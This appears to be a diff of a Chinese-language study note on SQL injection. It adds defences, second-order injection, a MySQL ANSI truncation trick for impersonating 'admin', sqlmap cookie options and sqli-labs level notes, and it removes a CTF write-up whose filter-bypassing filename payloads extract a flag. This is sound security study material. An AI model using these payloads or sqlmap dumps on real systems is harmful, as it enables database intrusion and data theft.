@@ -157,6 +157,8 @@ SELECT * FROM `users` WHERE id=("1");#双引号加括号
 
 ?id=1* and 1=2
 ```
+==防止数字型注入很简单就是比如is_numeric()，ctype_digit()函数判断处理数据类型==
+
 ##### 字符型注入
 ==关键是如何闭合sql语句以及注释多余的代码==
 这是可以被字符型注入的源代码。
@@ -164,7 +166,7 @@ SELECT * FROM `users` WHERE id=("1");#双引号加括号
   $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
 ```
 可以用对应的闭合符号去闭合，或者用注释符号。
-
+==防止的方法就是对特殊字符进行转义==
 #### 开联合
 
 步骤
@@ -178,6 +180,12 @@ SELECT * FROM `users` WHERE id=("1");#双引号加括号
 ?id=1* union select 1,2,3 -- #
 
 ==有回显点及联合查询==
+##### 不同数据库字符连接符
+```
+SQL Server:+
+Oracle：||
+MySQL：空格
+```
 #### SQL Server
 ###### SQL server提供了大量识图，便于取得元数组
 | 数据库识图 | 说明 |
@@ -380,6 +388,12 @@ limit使用格式:limit m,n ，其中m是指记录开始的位置，n是指n条�
 宽字节注入漏洞原理就是因为编码不统一所照成的，这种注入一般出现在PHP+Mysql中。
 ==php配置文件的php.ini中存在magic_quotes_gpc选项，被成为魔术引号，开启时候，会把get,post,cookie接收的（'"\null）等都会自动加上反斜杠转义。==
 
+##### sql二次注入
+一边是写入注册功能
+用addslashes()进行转义第一次不能注入，但是写入了单引号（'）进入
+一边是读取显示功能
+读取内容直接把单引号带出来了（'）导致注入出现，实现二次注入
+多用于注册和更新用户之类的上面。
 
 ##### 堆叠查询注入攻击
 堆叠注入查询可以执行多条语句，多条语句用分号分开。
@@ -468,6 +482,8 @@ if(条件，表达式1,表达式2):如果条件为真，返回表达式1,否则�
 用 if（布尔盲注的语句,sleep(2),1) --#
 
 对了就延迟2秒
+
+
 
 
 ## insert/update/delete注入
@@ -634,7 +650,8 @@ risk 2：基于事件的测试;risk 3：or语句的测试;risk 4：update的测�
 ###### 操作系统访问：
 ```text
 --os-cmd=OSCMD      执行操作系统命令（OSCMD）
---os-shell          交互式的操作系统的shell
+
+交互式的操作系统的shell
 ```
 ##### 写入webshell条件
 
@@ -661,11 +678,45 @@ sqlmap.py -u "url" --columns -T admin    列出admin的内容
 
 sqlmap.py -u "url" --dump -T admin "useradmin,password"    列出useradmin password的内容
 ```
+##### MySQL长字符阶段
+下面重点讨论当sql_mode模式为ANSI时引起的长字符截断问题：  
+==正常默认是严格的，长度超过就错误，而ANSI是警告从而出现漏洞==
+查询sql_mode:
+```
+select @@sql_mode
+```
+首先将sql_mode设置为ANSI模式：
+
+```
+SET @@sql_mode=ANSI;
+```
+接下来依次创建table,插入数据，这里发现username='admin x’也插入成功了：
+
+```mysql
+create table users(
+    -> id int(11) NOT NULL,
+    -> username varchar(7) NOT NULL,
+    -> password varchar(12) NOT NULL);#创建users表格
+insert into users values (1,'admin',123);#正常插入
+insert into users values (2,'admin   ',1234);#警告，插入成功
+insert into users values (3,'admin  x',12345);#警告，插入成功
+```
+![[Pasted image 20240119183649.png]]
+id=2,id=3的username均被截断，长度都变成了7：
+如果此时选择username= 'admin’会出现下面情况：
+
+```sql
+select username from users where username = 'admin';
+```
+![[Pasted image 20240119183712.png]]
+漏洞原理：此时，我们只查询了用户名为admin的用户，但另外两个长度不一致的用户却出现，这会造成安全问题。假如，某个管理员的用户名就是admin,他采用下面的语句登录：
+$sql = "select count ( * ) from users where username = ‘admin’ and password = ‘`*****’` ";此时，==我们只要伪造用户’admin x’便可以获得管理员的信息==，从而进入后台。
+
 ##### **Request：可用于指定如何连接到目标url；**
 ```
   -A				 	HTTP用户代理头的值
   -H				 	额外的头 (例如：X-Forwarded-For: 127.0.0.1)
-  --forms 				参数自动搜索表单
+  --forms 				参数自动搜索表单,自己抓包
   --method=    		 	指定HTTP方法 (例如：GET/POST)
   --data=	         	通过POST发送的数据字符串 (例如：id=1)
   --cookie=    		 	HTTP Cookie头的值 (例如：PHPSESSID=a8d127e..)
@@ -731,6 +782,8 @@ python sqlmap.py -u "http://x.x.x.x/" --referer="*" --dbs
 python sqlmap.py -u "http://x.x.x.x/" --date="xxx" --header="X-Forwared-For:xxx" --dbs
 ```
 ###### COOKIE注入
+![[Pasted image 20240118181228.png]]
+
 
 测试发现
 
@@ -739,6 +792,7 @@ you have not declared cookie(s), while server wants to set its own ('PHPSESSID=7
 要登录，说明就加上cookie:
 
 登录进去将cookie值和名字用等于号，两个就分号。
+###### 指定cookie预登录
 
 ```
 --cookie="security=low;PHPSESSID=48cd553d6c888553e76b1a1d6ba9078b"
@@ -748,109 +802,6 @@ HTTP Cookie在level为2的时候就会测试
 
 HTTP User-Agent/Referer头在level为3的时候就会测试。
 
-奇葩SQL注入
-
-这题比较意外，不是上传题是sql注入而且还是文件名的SQL注入，
-
-因为回显的只是文件名，然后它存入数据库的也可能是文件名，既然连接了数据库就可能存在注入漏洞。然后就能想到可能是文件名sql注入。
-
-任何与数据库发生连接交互的地方都可能存在SQL注入！
-
-然后就开始构造文件名的payload，首先介绍几个函数。
-
-conv(N,from_base,to_base) conv函数接收一个数字，进行进制转换
-
-N是指函数接受的数值，from_base是指这个数值原来的进制，to_base是指需要转化的进制。
-
-Substr()
-
-第一种：
-
-SBUSTR(str,pos);
-
-就是从pos开始的位置，一直截取到最后。
-
-第二种：
-
-SUBSTR(str,pos,len);
-
-len指截取长度
-
-这种表示的意思是，就是从pos开始的位置，截取len个字符(空白也算字符)。
-
-需要注意的是：如果pos为1(而不是0)，表示从第一个位置开始
-
-Hex()
-
-这个函数就是把里面的参数转化成16进制。
-
-接下来经过测试，题目过滤了select、from，使用selselctect和frfromom
-
-sselectelect database() => 0
-
-selecselectt substr(dAtabase(),1,12) => 0
-
-selecselectt substr(hex(dAtabase()),1,12) => 7765625 这里正常应该显示7765625f7570才对，可能是题目的设置，出现字母以后后面内容就会被截断
-
-所以才用到了CONV，将16进制转化为10进制，读取出来的数据都是十进制的，先转换成十六进制然后转换为字符
-
-文件名 读取出来的十进制 对应字符
-
-‘+(selselectect conv(substr(hex(database()),1,12),16,10))+’ 131277325825392 web_up
-
-‘+(selselectect conv(substr(hex(database()),13,12),16,10))+’ 1819238756 load
-
-即查出库名：web_upload
-
-查表
-
-这里表名比较长，所以我们分三次读取
-
-'+(seleselectct+conv(substr(hex((selselectect table_name frfromom information_schema.tables where table_schema='web_upload' limit 1,1)),1,12),16,10))+'
-
-上述payload返回：114784820031327 转换为字符： hello_
-
-'+(seleselectct+conv(substr(hex((selselectect table_name frfromom information_schema.tables where table_schema='web_upload' limit 1,1)),13,12),16,10))+'
-
-上述payload返回：112615676665705 转换为字符： flag_i
-
-'+(seleselectct+conv(substr(hex((selselectect table_name frfromom information_schema.tables where table_schema='web_upload' limit 1,1)),25,12),16,10))+'
-
-上述payload返回：126853610566245 转换为字符： s_here
-
-拼接起来最终得到表名：hello_flag_is_here
-
-查字段
-
-这里查字段分两次
-
-'+(seleselectct+conv(substr(hex((selselectect column_name frfromom information_schema.columns where table_name='hello_flag_is_here' limit 0,1)),1,12),16,10))+'
-
-上述payload返回：115858377367398 转换为字符： i_am_f
-
-'+(seleselectct+conv(substr(hex((selselectect column_name frfromom information_schema.columns where table_name='hello_flag_is_here' limit 0,1)),13,12),16,10))+'
-
-上述payload返回：7102823 转换为字符： lag
-
-拼接起来最终得到字段名：i_am_flag
-
-查字段内容
-
-分三次查
-
-'+(seleselectct+conv(substr(hex((selselectect i_am_flag frfromom hello_flag_is_here limit 0,1)),1,12),16,10))+'
-
-上述payload返回：36427215695199 转换为字符：!!@m
-
-'+(seleselectct+conv(substr(hex((selselectect i_am_flag frfromom hello_flag_is_here limit 0,1)),13,12),16,10))+'
-
-上述payload返回：92806431727430 转换为字符：Th.e_F
-
-'+(seleselectct+conv(substr(hex((selselectect i_am_flag frfromom hello_flag_is_here limit 0,1)),25,12),16,10))+'
-
-上述payload返回：560750951 转换为字符：!lag
-
-综上所述字段内容为：!!_@m_Th.e_F!lag
 
 #### 一、堆叠注入介绍
 
@@ -963,3 +914,27 @@ SQLMap的脚本都存放在安装目录的tamper文件夹中
 ```
 sqlmap -u [url] --tamper [模块名]
 ```
+## sql注入没学的内容
+floor函数进行报错注入
+oracle数据库的注入
+update语句
+insert语句
+post盲注之指定闭合
+## SQL-list做题
+###### Level-12-16:POST盲注
+
+###### Level-17:post/passwd报错注入
+提示：
+![[Pasted image 20240118183907.png]]
+![[Pasted image 20240118183655.png]]
+###### Level-18:User Agent报错注入
+提示：
+![[Pasted image 20240118183258.png]]
+![[Pasted image 20240118183426.png]]
+###### Level-19:Referer报错注入
+提示:
+![[Pasted image 20240118182239.png]]
+![[Pasted image 20240118183039.png]]
+
+###### Leval-20：cookie联合注入 
+![[Pasted image 20240118181228.png]]
